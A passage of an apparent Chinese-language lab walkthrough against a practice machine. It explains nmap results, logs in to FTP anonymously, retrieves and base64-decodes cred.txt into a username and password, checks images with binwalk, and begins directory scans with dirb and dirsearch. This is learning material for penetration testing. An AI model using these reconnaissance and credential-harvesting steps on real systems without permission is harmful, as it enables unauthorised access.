+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">32</span><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">33</span><span>|_    Auth decrypt failed
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">34</span><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#a5d6ff">1</span> open and <span style="color:#a5d6ff">1</span> closed port</span></span></code></pre></div><ul>
+<li>1.端口21(FTP)：
+<ul>
+<li><code>| ftp-anon: Anonymous FTP login allowed (FTP code 230)</code>允许匿名登陆，任何人无需密码可进入FTP服务器</li>
+<li><code>| -rw-r--r--    1 0        0              21 Sep 21  2021 cred.txt</code>目录下存在名为<code>cred.txt</code>的文件，<code>cred</code>是Credentials凭据的缩写，大概率有账户密码</li>
+</ul>
+</li>
+<li>2.端口80(HTTP):
+<ul>
+<li><code>|_http-title: Login</code>该网页是一个登录页面，结合FTP发现的<code>cred.txt</code>，这里通常是提交凭据、尝试获取系统权限的地方</li>
+</ul>
+</li>
+<li>3.端口65534(Unkown)：
+<ul>
+<li><code>|_    Auth decrypt failed</code>返回授权解密失败，说明端口运行着一个非标准服务，等待特定加密字符串或认证密钥</li>
+</ul>
+</li>
+<li>4.扫描警告：
+<ul>
+<li><code>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</code>，Nmap无法找到关闭的端口，导致系统版本识别不准确，说明目标主机有防火墙屏蔽了大部分端口（第一次命令响应慢的原因）</li>
+</ul>
+</li>
+</ul>
+<h3 id="12-ftp端口">1.2 ftp端口<a class="anchor" href="#12-ftp%e7%ab%af%e5%8f%a3">#</a></h3>
+<p><code>ftp://192.168.242.43</code>输入后无响应，是由于现代浏览器已停止支持<code>ftp://</code>协议，因此使用终端FTP客户端，ftp连接到目标靶机，Name中输入<code>anonymous</code>，Password直接回车，ftp&gt;中输入ls，<code>get</code>将cred.txt和welcome下载下来，接着exit退出</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ sudo ftp 192.168.242.43                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> kali: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>Connected to 192.168.242.43.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span><span style="color:#a5d6ff">220</span> <span style="color:#ff7b72;font-weight:bold">(</span>vsFTPd 3.0.3<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>Name <span style="color:#ff7b72;font-weight:bold">(</span>192.168.242.43:kali<span style="color:#ff7b72;font-weight:bold">)</span>: anonymous
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span><span style="color:#a5d6ff">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>Password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span><span style="color:#a5d6ff">230</span> Login successful.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>Remote system type is UNIX.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span><span style="color:#a5d6ff">229</span> Entering Extended Passive Mode <span style="color:#ff7b72;font-weight:bold">(||</span>|36513|<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span><span style="color:#a5d6ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>-rw-r--r--    <span style="color:#a5d6ff">1</span> <span style="color:#a5d6ff">0</span>        <span style="color:#a5d6ff">0</span>              <span style="color:#a5d6ff">21</span> Sep <span style="color:#a5d6ff">21</span>  <span style="color:#a5d6ff">2021</span> cred.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>-rw-r--r--    <span style="color:#a5d6ff">1</span> <span style="color:#a5d6ff">0</span>        <span style="color:#a5d6ff">0</span>              <span style="color:#a5d6ff">86</span> Jun <span style="color:#a5d6ff">11</span>  <span style="color:#a5d6ff">2021</span> welcome
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span><span style="color:#a5d6ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>ftp&gt; get cred.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>local: cred.txt remote: cred.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span><span style="color:#a5d6ff">229</span> Entering Extended Passive Mode <span style="color:#ff7b72;font-weight:bold">(||</span>|63973|<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span><span style="color:#a5d6ff">150</span> Opening BINARY mode data connection <span style="color:#ff7b72">for</span> cred.txt <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">21</span> bytes<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>100% |***************************************************************************************************************|    <span style="color:#a5d6ff">21</span>        1.74 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span><span style="color:#a5d6ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span><span style="color:#a5d6ff">21</span> bytes received in 00:00 <span style="color:#ff7b72;font-weight:bold">(</span>1.04 KiB/s<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span>ftp&gt; get welcome
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span>local: welcome remote: welcome
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span><span style="color:#a5d6ff">229</span> Entering Extended Passive Mode <span style="color:#ff7b72;font-weight:bold">(||</span>|11859|<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">28</span><span><span style="color:#a5d6ff">150</span> Opening BINARY mode data connection <span style="color:#ff7b72">for</span> welcome <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">86</span> bytes<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">29</span><span>100% |***************************************************************************************************************|    <span style="color:#a5d6ff">86</span>       34.53 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">30</span><span><span style="color:#a5d6ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">31</span><span><span style="color:#a5d6ff">86</span> bytes received in 00:00 <span style="color:#ff7b72;font-weight:bold">(</span>16.18 KiB/s<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">32</span><span>ftp&gt; exit
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">33</span><span><span style="color:#a5d6ff">221</span> Goodbye.</span></span></code></pre></div><p>查看cred.txt，获得<code>Y2hhbXA6cGFzc3dvcmQ=</code>，接着进行<code>base64</code>命令解码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>└─$ echo <span style="color:#a5d6ff">&#34;Y2hhbXA6cGFzc3dvcmQ&#34;</span> | base64 -d                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>champ:password    </span></span></code></pre></div><p>得到用户名champ，密码password</p>
+<h3 id="13-80端口">1.3 80端口<a class="anchor" href="#13-80%e7%ab%af%e5%8f%a3">#</a></h3>
+<p>回到靶机ip界面登录80端口，单击about us会下载一个文件</p>
+<h2 id="二信息分析">二、信息分析<a class="anchor" href="#%e4%ba%8c%e4%bf%a1%e6%81%af%e5%88%86%e6%9e%90">#</a></h2>
+<h3 id="21文件整理">2.1文件整理<a class="anchor" href="#21%e6%96%87%e4%bb%b6%e6%95%b4%e7%90%86">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>└─$ cd ~/z_downloads
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>└─$ ls         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>funny.bmp  funny.jpg  sudo</span></span></code></pre></div><h3 id="22图片检查">2.2图片检查<a class="anchor" href="#22%e5%9b%be%e7%89%87%e6%a3%80%e6%9f%a5">#</a></h3>
+<h4 id="221-binwalk工具">2.2.1 binwalk工具<a class="anchor" href="#221-binwalk%e5%b7%a5%e5%85%b7">#</a></h4>
+<p>用binwalk查看图片</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ binwalk funny.bmp 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>DECIMAL       HEXADECIMAL     DESCRIPTION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>--------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span><span style="color:#a5d6ff">0</span>             0x0             JPEG image data, JFIF standard 1.01
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>└─$ binwalk funny.jpg
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>DECIMAL       HEXADECIMAL     DESCRIPTION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>--------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span><span style="color:#a5d6ff">0</span>             0x0             JPEG image data, JFIF standard 1.01</span></span></code></pre></div><p>没有发现什么</p>
+<h4 id="222-dirb工具">2.2.2 dirb工具<a class="anchor" href="#222-dirb%e5%b7%a5%e5%85%b7">#</a></h4>
+<p>再扫描网站目录，dirb是用于web目录扫描的工具，通过内置的字典尝试在目标网站后面拼接常见路径（如<code>/admin</code>、<code>/config</code>、<code>/uploads</code>）</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ dirb http://192.168.242.43
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>-----------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>DIRB v2.22    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>By The Dark Raver
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>-----------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>START_TIME: Tue Jan <span style="color:#a5d6ff">20</span> 21:40:20 <span style="color:#a5d6ff">2026</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>URL_BASE: http://192.168.242.43/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>-----------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>GENERATED WORDS: <span style="color:#a5d6ff">4612</span>                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>---- Scanning URL: http://192.168.242.43/ ----
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>+ http://192.168.242.43/index.html <span style="color:#ff7b72;font-weight:bold">(</span>CODE:200|SIZE:5825<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>+ http://192.168.242.43/index.php <span style="color:#ff7b72;font-weight:bold">(</span>CODE:302|SIZE:0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>+ http://192.168.242.43/server-status <span style="color:#ff7b72;font-weight:bold">(</span>CODE:403|SIZE:279<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>-----------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span>END_TIME: Tue Jan <span style="color:#a5d6ff">20</span> 21:40:29 <span style="color:#a5d6ff">2026</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span>DOWNLOADED: <span style="color:#a5d6ff">4612</span> - FOUND: <span style="color:#a5d6ff">3</span></span></span></code></pre></div><h4 id="223-dirsearch">2.2.3 dirsearch<a class="anchor" href="#223-dirsearch">#</a></h4>
+<p>安装dirsearch<code>sudo apt update &amp;&amp; sudo apt install dirsearch -y</code>，其中<code>apt</code>是(advanced package tool)</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ dirsearch -u http://192.168.242.43
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>  from pkg_resources import DistributionNotFound, VersionConflict
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span> <span style="color:#ff7b72;font-weight:bold">(</span>_<span style="color:#ff7b72;font-weight:bold">||</span>| _<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>/_<span style="color:#ff7b72;font-weight:bold">(</span>_<span style="color:#ff7b72;font-weight:bold">||</span> <span style="color:#ff7b72;font-weight:bold">(</span>_| <span style="color:#ff7b72;font-weight:bold">)</span>                                                                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style="color:#a5d6ff">25</span> | Wordlist size: <span style="color:#a5d6ff">11460</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>Output File: /home/kali/reports/http_192.168.242.43/_26-01-20_21-55-58.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>Target: http://192.168.242.43/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:58<span style="color:#ff7b72;font-weight:bold">]</span> Starting:                                                                                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.ht_wsr.txt                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htaccess.bak1                                   
